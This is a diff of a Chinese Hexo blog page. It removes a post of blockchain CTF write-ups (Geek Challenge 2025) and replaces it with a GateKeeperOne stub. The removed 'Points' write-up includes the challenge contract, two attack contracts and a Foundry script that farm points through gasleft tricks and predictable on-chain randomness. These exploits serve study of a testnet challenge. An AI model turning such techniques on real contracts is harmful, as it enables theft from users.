@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -14,20 +14,22 @@
 
 
 <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
   <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
   <script src="/lib/pace/pace.min.js"></script>
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
   <meta property="og:type" content="website">
-<meta property="og:title" content="MyBlog">
+<meta property="og:title" content="AUV wordmaya">
 <meta property="og:url" content="http://example.com/page/2/index.html">
-<meta property="og:site_name" content="MyBlog">
-<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="AUV wordmaya">
+<meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="wordmaya">
+<meta property="article:tag" content="blockchain, solidity, security, ctf, web3">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="http://example.com/page/2/">
@@ -39,11 +41,11 @@
     sidebar: "",
     isHome : true,
     isPost : false,
-    lang   : 'en'
+    lang   : 'zh-CN'
   };
 </script>
 
-  <title>MyBlog</title>
+  <title>AUV wordmaya</title>
   
 
 
@@ -74,7 +76,7 @@
   </style>
 </noscript>
 
-<link rel="alternate" href="/atom.xml" title="MyBlog" type="application/atom+xml">
+<link rel="alternate" href="/atom.xml" title="AUV wordmaya" type="application/atom+xml">
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -84,7 +86,7 @@
     <header class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
+    <div class="toggle" aria-label="切换导航栏">
       <span class="toggle-line toggle-line-first"></span>
       <span class="toggle-line toggle-line-middle"></span>
       <span class="toggle-line toggle-line-last"></span>
@@ -95,9 +97,10 @@
 
     <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">MyBlog</h1>
+      <h1 class="site-title">AUV wordmaya</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
+      <p class="site-subtitle" itemprop="description">玩得开心</p>
   </div>
 
   <div class="site-nav-right">
@@ -113,42 +116,42 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-schedule">
 
-    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
 
   </li>
         <li class="menu-item menu-item-sitemap">
 
-    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a>
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
 
   </li>
         <li class="menu-item menu-item-commonweal">
 
-    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a>
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
 
   </li>
   </ul>
@@ -177,8 +180,8 @@
       
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/24/Points/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/24/GateKeeperOne/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -187,39 +190,46 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="MyBlog">
+      <meta itemprop="name" content="AUV wordmaya">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2026/03/24/Points/" class="post-title-link" itemprop="url">25极客大挑战</a>
+            <a href="/2026/03/24/GateKeeperOne/" class="post-title-link" itemprop="url">GateKeeperOne</a>
         </h2>
 
         <div class="post-meta">
+          
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-calendar"></i>
               </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
+              <span class="post-meta-item-text">发表于</span>
 
-              <time title="Created: 2026-03-24 10:49:52 / Modified: 11:49:51" itemprop="dateCreated datePublished" datetime="2026-03-24T10:49:52+08:00">2026-03-24</time>
+              <time title="创建时间：2026-03-24 10:49:52" itemprop="dateCreated datePublished" datetime="2026-03-24T10:49:52+08:00">2026-03-24</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-03-27 11:47:39" itemprop="dateModified" datetime="2026-03-27T11:47:39+08:00">2026-03-27</time>
+              </span>
 
           <br>
-            <span class="post-meta-item" title="Symbols count in article">
+            <span class="post-meta-item" title="本文字数">
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>8k</span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.6k</span>
             </span>
-            <span class="post-meta-item" title="Reading time">
+            <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>7 mins.</span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
             </span>
 
         </div>
@@ -231,94 +241,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="Blockchain-SignIn"><a href="#Blockchain-SignIn" class="headerlink" title="Blockchain SignIn"></a>Blockchain SignIn</h1><p><code>0x208e0465ea757073d0ec6af9094e5404ef81a213970eb580fa6a28a3af4669d6</code></p>
-<p>在sepolia 测试网查询交易</p>
-<p><img src="C:\Users\34420\AppData\Roaming\Typora\typora-user-images\image-20251107201649802.png" alt="image-20251107201649802"></p>
-<p>将输入数据转化为字符串</p>
-<p><img src="C:\Users\34420\AppData\Roaming\Typora\typora-user-images\image-20251107202109477.png" alt="image-20251107202109477"></p>
-<p>可得 SYC{w3b3_g4m3_st4rt}</p>
-<h1 id="1Z-Sign"><a href="#1Z-Sign" class="headerlink" title="1Z Sign"></a>1Z Sign</h1><p><code>主网这笔交易交互池子的费率0x1d3040872d9c3d15d47323996926c2aa5c7b636fc7209f701301878dcf438598</code></p>
-<p>在主网(<a target="_blank" rel="noopener" href="https://etherscan.io/)%E6%9F%A5%E8%AF%A2%E9%93%BE%E4%B8%8A%E6%97%A5%E5%BF%97">https://etherscan.io/)查询链上日志</a></p>
-<p><img src="C:\Users\34420\AppData\Roaming\Typora\typora-user-images\image-20251028185643153.png" alt="image-20251028185643153"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Address</span><br><span class="line">0x000000000004444c5dc75cb358380d2e3de08a90 (Uniswap V4: Pool Manager)</span><br></pre></td></tr></table></figure>
-
-<p>可知该交易来自UniswapV4</p>
-<p><em><strong>fee &#x3D; 9900</strong></em></p>
-<p>UniswapV4池子的费率在内部都以「百万分之一」为单位进行存储和计算。</p>
-<p><code>fee = 1</code>代表费率为<strong>0.0001%</strong></p>
-<p>那么</p>
-<p><code>fee = 9900</code>代表费率为<strong>0.99%</strong></p>
-<h1 id="Dream"><a href="#Dream" class="headerlink" title="Dream"></a>Dream</h1><p><code>小明昨晚梦见一个很奇怪的sepolia地址0xd8B361E50174c4Ae99E31dCdF10B353C961f9C43，于是他决定去看看。</code></p>
-<p>在sepolia 测试网查询交易</p>
-<p><img src="C:\Users\34420\AppData\Roaming\Typora\typora-user-images\image-20251107202559526.png" alt="image-20251107202559526"></p>
-<p>直接将合约创建字节码转为字符串</p>
-<p><img src="C:\Users\34420\AppData\Roaming\Typora\typora-user-images\image-20251107202819343.png" alt="image-20251107202819343"></p>
-<h1 id="Points"><a href="#Points" class="headerlink" title="Points"></a>Points</h1><ul>
-<li>通关条件是<code>points[msg.sender] &gt;= 25</code></li>
-<li><code>msg.sender</code>的初始points是0</li>
-</ul>
-<hr>
-<p><strong>函数</strong></p>
-<ul>
-<li><code>checkIn()</code>:要求满足<code>lastSignin[msg.sender] + wait &lt;= block.timestamp || lastSignin[msg.sender] == 0</code>，用户的points+1，同时<code>lastSignin[msg.sender] = block.timestamp;</code>也就是说我们第一次调用该函数时是满足条件的，该函数限制我们的调用次数 — &#x3D;&#x3D;1&#x3D;&#x3D;</li>
-<li><code>transferPoints()</code>:<code>target != address(0)</code>要求目标地址为非零地址，当target的points&#x3D; 0时，<code>points[target] + transferpoints &lt;= 3</code> 要求目标地址所持有的points与<code>msg.sender</code>转入的points和不大于3，也就是说，当我们的目标地址所持有的points为0时（第一个调用这个函数），我们能在这个函数得到最高3points —&#x3D;&#x3D;3&#x3D;&#x3D;</li>
-<li><code>buyPoints()</code>:我们初始是<code>!isBuy</code>所以是可以直接调用的，但要求我们持有的points大于3，且调用之后<code>isBuy = true</code>，限制我们只能调用一次 —&#x3D;&#x3D;1&#x3D;&#x3D;</li>
-<li><code>checkUserContract()</code>:我们输入一个合约地址，该合约进行静态调用自身的<code>getValue()</code>,如果第一次返回0，第二次返回1，<code>msg.sender</code>的points加10 —&#x3D;&#x3D;10&#x3D;&#x3D;</li>
-<li><code>good_luck()</code>:当我们持有的points &#x3D;&#x3D; lucknum时，msg.sender的points加10，cast storage 读取lucknum的值为13  —&#x3D;&#x3D;10&#x3D;&#x3D;</li>
-</ul>
-<p><img src="C:\Users\34420\AppData\Roaming\Typora\typora-user-images\image-20251107203943040.png" alt="image-20251107203943040"></p>
-<p><strong>思路</strong></p>
-<ul>
-<li>先构造两个攻击合约 <code>attack1</code> 和 <code>attack2</code>：<ul>
-<li><code>attack1</code>：只实现 <code>getValue()</code>，用途是作为 <code>Points.checkUserContract()</code> 的 target 参数之一。<code>getValue()</code> 的实现要能在目标合约对它做 <strong>两次 <code>staticcall</code></strong> 时分别返回 <code>0</code>（第一次）和 <code>1</code>（第二次）。常见做法是让 <code>getValue()</code> 的返回依赖 <code>gasleft()</code> 或其它在两次调用之间可能不同的环境，可用 gasleft()第一次调用某地址gas fee 大于1000，再次访问gasfee小于1000，我们可以利用这一特质让其第一次返回0，第二次返回1。</li>
-<li><code>attack2</code>：作为“协调器&#x2F;部署器”——负责部署 <code>attack1</code>（或其它 candidate），并在合适时机触发 <code>Points.checkUserContract(address(attack1))</code>。此外 <code>attack2</code> 可以包含另一版 <code>getValue()</code> 作为备用 candidate，使你可以用不同策略做多次尝试。</li>
-</ul>
-</li>
-<li><code>vm.startBroadcast()</code>（脚本发起 EOA 开始广播）</li>
-<li>部署 <code>Attack2</code>（<code>Attack2</code> 构造函数内部部署 <code>Attack1</code>）</li>
-<li><code>attack.attack()</code>（由 <code>Attack2</code> 发起）：<ul>
-<li><code>Attack2</code> 调用了 <code>points.checkUserContract(address(attack1))</code>（<code>msg.sender</code> &#x3D; <code>Attack2</code>），如果 <code>Attack1.getValue()</code> 在两次 <code>staticcall</code> 中返回 <code>0</code> then <code>1</code>，那么 <code>points[Attack2] += 10</code>（Attack2 获得 10 分）。</li>
-<li>然后 <code>Attack2</code> 调用 <code>points.transferPoints(tx.origin, 3)</code>，把 3 分从 <code>Attack2</code> 转给脚本发起的 EOA（前提：Attack2 有 &gt;&#x3D;3 分，EOA 当前分数为 0，因此接收限制 <code>points[target] + 3 &lt;= 3</code> 被满足）。结果：<code>Attack2</code> 剩 7，EOA 得 3。</li>
-</ul>
-</li>
-<li>脚本（EOA）调用 <code>points.checkUserContract(address(attack))</code>（此时 <code>msg.sender</code> &#x3D; EOA，<code>userContract</code> &#x3D; <code>attack2</code>）：<ul>
-<li>Points 对 <code>attack2.getValue()</code> 做两次 <code>staticcall</code>；若这两个调用返回 <code>0</code> then <code>1</code>（Attack2.getValue 的实现与 Attack1 类似，依赖 gasleft），则 EOA 得 +10。结果：EOA 总分 &#x3D; 3 + 10 &#x3D; 13。</li>
-</ul>
-</li>
-<li>脚本（EOA）调用 <code>points.good_luck()</code>：<ul>
-<li><code>good_luck()</code> 内部计算 <code>target</code> 与 <code>pseudoRandom</code>。你从 storage 读取到 <code>luckynum</code> &#x3D; 13。因为此时 EOA 的 points &#x3D; 13（正好等于 luckynum），在当前 <code>block.timestamp</code> 与哈希组合下 <code>target</code> 与 <code>pseudoRandom</code> 会相等，从而获得 +10。结果：EOA 分数 &#x3D; 13 + 10 &#x3D; 23。</li>
-</ul>
-</li>
-<li>脚本调用 <code>points.buyPoints()</code>：<ul>
-<li>需 <code>points[EOA] &gt;= 3</code>（满足），<code>isBuy</code> 初始为 <code>false</code>，调用成功，<code>isBuy = true</code>，并且 <code>points[EOA] += 1</code>。结果：EOA &#x3D; 23 + 1 &#x3D; 24。</li>
-</ul>
-</li>
-<li>脚本调用 <code>points.checkIn()</code>：<ul>
-<li>首次签到 <code>lastSignin[EOA] == 0</code>，调用成功，<code>points[EOA] += 1</code>。结果：EOA &#x3D; 24 + 1 &#x3D; 25。</li>
-</ul>
-</li>
-<li>脚本调用 <code>points.check()</code>：<ul>
-<li><code>require(points[msg.sender] &gt;= 25)</code> 满足，<code>Flag[EOA] = true</code>，通关完成。</li>
-</ul>
-</li>
-</ul>
-<hr>
-<p><strong>源代码</strong></p>
-<p>contract.sol</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.9;</span><br><span class="line">//sepolia address:0x877e0B8fB7090C5e60eE5f605f8b67281aD4036C</span><br><span class="line">contract Points &#123;</span><br><span class="line">    uint256 public wait = 60 * 60 * 24 * 365;//0</span><br><span class="line">    uint256 private luckynum;//1 --13</span><br><span class="line">    bool public isBuy;</span><br><span class="line">    mapping(address =&gt; bool) public Flag;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public lastSignin;</span><br><span class="line">    mapping(address =&gt; uint256) public points;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public userContractCallState;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function checkIn() public &#123;</span><br><span class="line">        require(</span><br><span class="line">            lastSignin[msg.sender] + wait &lt;= block.timestamp || lastSignin[msg.sender] == 0,</span><br><span class="line">            &quot;See you next year&quot;</span><br><span class="line">        );</span><br><span class="line">        points[msg.sender] += 1;</span><br><span class="line">        lastSignin[msg.sender] = block.timestamp;</span><br><span class="line">    &#125;//1 </span><br><span class="line"></span><br><span class="line">    function transferPoints(address target, uint256 transferpoints) public &#123;</span><br><span class="line">        require(target != address(0), &quot;Invalid target address&quot;);</span><br><span class="line">        require(points[msg.sender] &gt;= transferpoints, &quot;Insufficient points&quot;);</span><br><span class="line">        require(points[target] + transferpoints &lt;= 3, &quot;Receiver cannot have more than 3 points&quot;);</span><br><span class="line">        points[msg.sender] -= transferpoints;</span><br><span class="line">        points[target] += transferpoints;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buyPoints() public payable &#123;</span><br><span class="line">        require(!isBuy, &quot;Points can only be purchased once&quot;);</span><br><span class="line">        require(points[msg.sender] &gt;= 3, &quot;Need at least 3 points to purchase&quot;);</span><br><span class="line">        isBuy = true;</span><br><span class="line">        points[msg.sender] += 1;</span><br><span class="line">    &#125;//1 </span><br><span class="line"></span><br><span class="line">    function checkUserContract(address userContract) public &#123;</span><br><span class="line">        uint256 state = userContractCallState[msg.sender][userContract];</span><br><span class="line">        require(state &lt; 2, &quot;Already called twice&quot;);</span><br><span class="line"></span><br><span class="line">        (bool s1, bytes memory d1) = userContract.staticcall(abi.encodeWithSignature(&quot;getValue()&quot;));</span><br><span class="line">        require(s1 &amp;&amp; d1.length == 32, &quot;First call failed&quot;);</span><br><span class="line">        uint256 r1 = abi.decode(d1, (uint256));</span><br><span class="line"></span><br><span class="line">        (bool s2, bytes memory d2) = userContract.staticcall(abi.encodeWithSignature(&quot;getValue()&quot;));</span><br><span class="line">        require(s2 &amp;&amp; d2.length == 32, &quot;Second call failed&quot;);</span><br><span class="line">        uint256 r2 = abi.decode(d2, (uint256));</span><br><span class="line"></span><br><span class="line">        require(r1 == 0 &amp;&amp; r2 == 1, &quot;Invalid return value sequence&quot;);</span><br><span class="line"></span><br><span class="line">        points[msg.sender] += 10;</span><br><span class="line">        userContractCallState[msg.sender][userContract] = 2;</span><br><span class="line">    &#125;//10 </span><br><span class="line"></span><br><span class="line">    function set_luckynum(uint256 _luckynum) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Don&#x27;t do that&quot;);</span><br><span class="line">        luckynum = _luckynum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function good_luck() public &#123;</span><br><span class="line">        uint256 pseudoRandom = uint256(</span><br><span class="line">            keccak256(abi.encodePacked(msg.sender, block.timestamp, luckynum))</span><br><span class="line">        ) % 100;</span><br><span class="line"></span><br><span class="line">        uint256 target = uint256(</span><br><span class="line">            keccak256(abi.encodePacked(msg.sender, block.timestamp, points[msg.sender]))</span><br><span class="line">        ) % 100;</span><br><span class="line"></span><br><span class="line">        require(target == pseudoRandom, &quot;Incorrect lucky number&quot;);</span><br><span class="line">        points[msg.sender] += 10;</span><br><span class="line">    &#125;//10 </span><br><span class="line"></span><br><span class="line">    function getUserPoints(address user) public view returns (uint256) &#123;</span><br><span class="line">        return points[user];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check() public &#123;</span><br><span class="line">        require(points[msg.sender] &gt;= 25, &quot;Not enough points (need 25)&quot;);</span><br><span class="line">        Flag[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>攻击合约</strong></p>
-<p>attack1.sol</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.9;</span><br><span class="line">//sepolia address:0x877e0B8fB7090C5e60eE5f605f8b67281aD4036C</span><br><span class="line">import &#123;Points&#125; from &quot;../src/contract.sol&quot;;</span><br><span class="line">contract Attack1 &#123;</span><br><span class="line">    </span><br><span class="line">    uint256 private counter;</span><br><span class="line">    Points points = Points(0x877e0B8fB7090C5e60eE5f605f8b67281aD4036C);</span><br><span class="line"></span><br><span class="line">    function getValue() public returns (uint256) &#123;</span><br><span class="line">        uint256 startGas = gasleft();</span><br><span class="line">        uint256 bal = address(0x11111).balance;</span><br><span class="line">        uint256 usedGas = startGas - gasleft();</span><br><span class="line">        if (usedGas &lt; 1000) &#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function getaddress1() public view returns (address) &#123;</span><br><span class="line">        return address(this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>attack2.sol</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.9;</span><br><span class="line">//sepolia address:0x877e0B8fB7090C5e60eE5f605f8b67281aD4036C</span><br><span class="line">import &#123;Points&#125; from &quot;../src/contract.sol&quot;;</span><br><span class="line">import &#123;Attack1&#125; from &quot;../src/attack1.sol&quot;;</span><br><span class="line">contract Attack2 &#123;</span><br><span class="line">    Points points = Points(0x877e0B8fB7090C5e60eE5f605f8b67281aD4036C);</span><br><span class="line">    Attack1 attack1 = new Attack1();</span><br><span class="line">    uint256 private counter;</span><br><span class="line"></span><br><span class="line">    function getValue() public returns (uint256) &#123;</span><br><span class="line">        uint256 startGas = gasleft();</span><br><span class="line">        uint256 bal = address(0x1111).balance;</span><br><span class="line">        uint256 usedGas = startGas - gasleft();</span><br><span class="line">        if (usedGas &lt; 1000) &#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function getaddress2() public view returns (address) &#123;</span><br><span class="line">        return address(this);</span><br><span class="line">    &#125;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        points.getUserPoints(address(this));</span><br><span class="line">        address attack = attack1.getaddress1();</span><br><span class="line">        points.checkUserContract(attack);</span><br><span class="line">        points.transferPoints(msg.sender, 3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>脚本</strong></p>
-<p>Hack.s.sol</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.9;</span><br><span class="line">//sepolia address:0x877e0B8fB7090C5e60eE5f605f8b67281aD4036C</span><br><span class="line">import &#123;Points&#125; from &quot;../src/contract.sol&quot;;</span><br><span class="line">import &#123;Attack2&#125; from &quot;../src/attack2.sol&quot;;</span><br><span class="line">import &#123;Script&#125; from &quot;forge-std/Script.sol&quot;;</span><br><span class="line">import &#123;console&#125; from &quot;forge-std/console.sol&quot;;</span><br><span class="line">contract Hack is Script &#123;</span><br><span class="line">    function run() external&#123;</span><br><span class="line">        vm.startBroadcast();</span><br><span class="line">        Points points = Points(0x877e0B8fB7090C5e60eE5f605f8b67281aD4036C);</span><br><span class="line">        Attack2 attack = new Attack2();</span><br><span class="line">        attack.attack();</span><br><span class="line">        points.checkUserContract(address(attack));</span><br><span class="line">        points.good_luck();</span><br><span class="line">        points.buyPoints();//1</span><br><span class="line">        points.checkIn();</span><br><span class="line">        //console.log(points.check());</span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
+          <h1 id="GateKeeperOne"><a href="#GateKeeperOne" class="headerlink" title="GateKeeperOne"></a>GateKeeperOne</h1><p>from Ethernaut</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2026/03/24/GateKeeperOne/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -337,7 +268,95 @@
       
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/24/FREEBIE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="wordmaya">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AUV wordmaya">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
